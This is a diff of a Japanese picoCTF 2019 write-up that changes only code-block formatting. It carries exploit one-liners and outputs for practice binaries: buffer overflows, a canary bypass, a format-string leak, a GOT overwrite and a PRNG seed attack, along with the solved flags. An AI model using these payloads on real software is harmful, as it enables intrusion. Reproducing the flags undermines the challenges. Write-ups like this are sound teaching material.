@@ -94,12 +94,12 @@ Attachment:
 ### Solution
 offsetを求めて、飛びたい関数に飛ぶだけ。
 
-```
+<pre>
 $ (python -c 'print("A"*76+"\xE6\x85\x04\x08")' ; cat - ) | ./vuln
 Give me a string and lets see what happens: 
 Woah, were jumping to 0x80485e6 !
 picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}
-```
+</pre>
 
 Flag: `picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}`
 
@@ -192,12 +192,12 @@ Attachment:
 ### Solution
 これはpicoCTF 2018のbof2とほぼ同じです。
 
-```
+<pre>
 $ (python -c 'print("A"*188+"\xe6\x85\x04\x08"+"BBBB"+"\xEF\xBE\xAD\xDE"+"\x0D\xD0\xDE\xC0")'; cat -) | ./vuln
 Please enter your string: 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBﾭ?
 picoCTF{arg5_and_r3turn55897b905}
-```
+</pre>
 
 Flag: `picoCTF{arg5_and_r3turn55897b905}`
 
@@ -224,12 +224,12 @@ Attachment:
 
 去年のどこかのWriteupにあったコードを流用させてもらって、canary (33xO) をゲット。
 
-```
+<pre>
 $ (python -c 'print("54\n"+"A"*32+"33xO"+"abcdefghijklmnop" + "\xed\x07")'; cat -) | ./vuln
 Please enter the length of the entry:
 > Input> Ok... Now Where's the Flag?
 picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
-```
+</pre>
 
 Flag: `picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}`
 
@@ -363,7 +363,8 @@ for i in range(1,100):
 
 <br />
 37番目に出てくるので、%37$s 入れるだけでもフラグは取れます。
-```
+
+<pre>
 $ ./vuln 
 input whatever string you want; then it will be printed back:
 
@@ -373,7 +374,7 @@ your input
 will be printed:
 
 picoCTF{str1nG_CH3353_159c98a8}
-```
+</pre>
 
 Flag: `picoCTF{str1nG_CH3353_159c98a8}`
 
@@ -394,20 +395,20 @@ Attachment:
 - vuln.c
 
 <br />
-```
+<pre>
 $ checksec vuln
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)   <---
-```
+</pre>
 
 
 <br />
 ### Solution
 
-```
+<pre>
 gef➤  x win
 0x80485c6 <win>:	0x53e58955
 
@@ -423,14 +424,14 @@ Dump of assembler code for function exit@plt:
    0x08048460 <+0>:	jmp    DWORD PTR ds:0x804a01c
    0x08048466 <+6>:	push   0x20
    0x0804846b <+11>:	jmp    0x8048410
-```
+</pre>
 
 0x804a01cを、0x80485c6 (win)に書き換えればOK。
 
 <br />
 10進数で入力します。
 
-```
+<pre>
 $ ./vuln 
 You can just overwrite an address, what can you do?
 
@@ -443,7 +444,7 @@ Input value?
 The following line should print the flag
 
 picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}
-```
+</pre>
 
 Flag: `picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}`
 
@@ -485,7 +486,7 @@ ProfessorのlastScoreにアドレスを入れて、Student構造体としてア�
 
 <br />
 
-```
+<pre>
 $ ./vuln 
 Input the name of a student
 aaa
@@ -511,7 +512,7 @@ ccc
 Input the score: 
 100
 picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}
-```
+</pre>
 
 Flag: `picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}`
 
@@ -537,7 +538,7 @@ Attachment:
 
 <br />
 実行例：
-```
+<pre>
 # ./seed_spring 
                                                                              
                           #                mmmmm  mmmmm    "    mm   m   mmm 
@@ -555,7 +556,7 @@ LEVEL (1/30)
 
 Guess the height: 2
 WRONG! Sorry, better luck next time!
-```
+</pre>
 
 
 <br />
@@ -592,12 +593,13 @@ int main()
 ```
 
 時間を合わせないといけないので、Shell server上で以下のように実行します。
-```
+<pre>
 $ ./seed_spring_solve.o ; nc 2019shell1.picoctf.com 12269
-```
+</pre>
 
 あとは出てきた値を1つずつ入れるだけです。
 
+<br>
 
 Flag: `picoCTF{pseudo_random_number_generator_not_so_random_66aacad47c332de30eb8d8170d96b772}`
 
